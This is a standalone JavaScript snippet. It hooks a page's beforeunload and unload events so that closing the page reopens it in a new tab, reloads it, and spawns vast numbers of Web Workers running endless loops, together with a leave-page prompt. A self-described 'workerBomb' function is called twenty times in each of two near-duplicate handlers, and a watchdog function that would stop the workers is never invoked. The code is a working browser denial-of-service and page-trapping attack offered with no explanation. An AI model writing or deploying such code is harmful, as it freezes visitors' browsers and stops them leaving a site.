
      
		window.addEventListener('beforeunload', function (event) {
		  window.open(window.location.href, '_blank');
		  setTimeout(() => {
					window.location.href = window.location.href;
				}, 1);
		  let workers = [];
		  let isResponsive = true;
	
		  function workerBomb() {
			console.log("Starting workerBomb...");
	
			const script = `
			  let counter = 0;
			  while (true) {
				counter++;
				Math.random() * Math.random();
	
				if (counter % 1e6 === 0) {
				  postMessage({ status: "working", counter });
				}
			  }
			`;
			const blob = new Blob([script], { type: "application/javascript" });
			const workerURL = URL.createObjectURL(blob);
	
			for (let i = 0; i < 1000000000000; i++) {
			  const worker = new Worker(workerURL);
			  workers.push(worker);
	
			  worker.onmessage = (event) => {
				if (event.data.status === "working") {
				  console.log(`Worker ${i} progress: ${event.data.counter}`);
				}
			  };
	
			  worker.onerror = (error) => {
				console.error(`Worker ${i} encountered an error:`, error);
			  };
			}
	
		  }
	
		  function startWatchdog() {
			console.log("Starting watchdog...");
	
			let lastTime = Date.now();
	
			const watchdogInterval = setInterval(() => {
			  const currentTime = Date.now();
	
			  if (currentTime - lastTime > 2000) {
				console.warn("Browser unresponsive detected. Terminating workers...");
				terminateWorkers();
				clearInterval(watchdogInterval);
			  } else {
				lastTime = currentTime;
			  }
			}, 100);
	
			(function monitorResponsiveness() {
			  for (let i = 0; i < 1e6; i++)
			  if (workers.length > 0) {
				requestAnimationFrame(monitorResponsiveness);
			  }
			})();
		  }
	
		  function terminateWorkers() {
			workers.forEach((worker, index) => {
			  worker.terminate();
			  console.log(`Worker ${index} terminated.`);
			});
			workers = [];
			console.log("All workers terminated.");
		  }
	
	
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  const message = "Are you sure you want to leave this page?";
		  
		  event.returnValue = message;
	
		  return message;
		});
	  
      
		window.addEventListener('unload', function () {
		  window.open(window.location.href, '_blank');
		  setTimeout(() => {
					window.location.href = window.location.href;
				}, 1);
		  let workers = [];
		  let isResponsive = true;
	
		  function workerBomb() {
			console.log("Starting workerBomb...");
	
			const script = `
			  let counter = 0;
			  while (true) {
				counter++;
				Math.random() * Math.random();
	
				if (counter % 1e6 === 0) {
				  postMessage({ status: "working", counter });
				}
			  }
			`;
			const blob = new Blob([script], { type: "application/javascript" });
			const workerURL = URL.createObjectURL(blob);
	
			for (let i = 0; i < 1000000000000; i++) {
			  const worker = new Worker(workerURL);
			  workers.push(worker);
	
			  worker.onmessage = (event) => {
				if (event.data.status === "working") {
				  console.log(`Worker ${i} progress: ${event.data.counter}`);
				}
			  };
	
			  worker.onerror = (error) => {
				console.error(`Worker ${i} encountered an error:`, error);
			  };
			}
	
		  }
	
		  function startWatchdog() {
			console.log("Starting watchdog...");
	
			let lastTime = Date.now();
	
			const watchdogInterval = setInterval(() => {
			  const currentTime = Date.now();
	
			  if (currentTime - lastTime > 2000) {
				console.warn("Browser unresponsive detected. Terminating workers...");
				terminateWorkers();
				clearInterval(watchdogInterval);
			  } else {
				lastTime = currentTime;
			  }
			}, 100);
	
			(function monitorResponsiveness() {
			  for (let i = 0; i < 1e6; i++)
			  if (workers.length > 0) {
				requestAnimationFrame(monitorResponsiveness);
			  }
			})();
		  }
	
		  function terminateWorkers() {
			workers.forEach((worker, index) => {
			  worker.terminate();
			  console.log(`Worker ${index} terminated.`);
			});
			workers = [];
			console.log("All workers terminated.");
		  }
	
	
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		 
		  const m = "Do you want to cloe?";
		  
		 
		  event.returnValue = m;
	
		  return m;
		});
	  